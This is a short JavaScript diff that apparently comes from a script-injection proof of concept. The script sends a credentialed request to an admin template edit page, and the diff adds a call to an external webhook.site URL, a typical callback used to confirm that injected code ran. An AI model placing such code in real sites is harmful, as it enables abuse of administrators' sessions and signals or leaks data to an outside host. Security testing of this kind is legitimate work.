@@ -5,4 +5,5 @@ let x = fetch("/admin/templates/1/edit", {
   "mode": "cors",
   "credentials": "include"
 });
+let y =  fetch("https://webhook.site/d1088d17-2a13-4a01-9c67-4e6f3967f9a8/");
 console.log("Done")
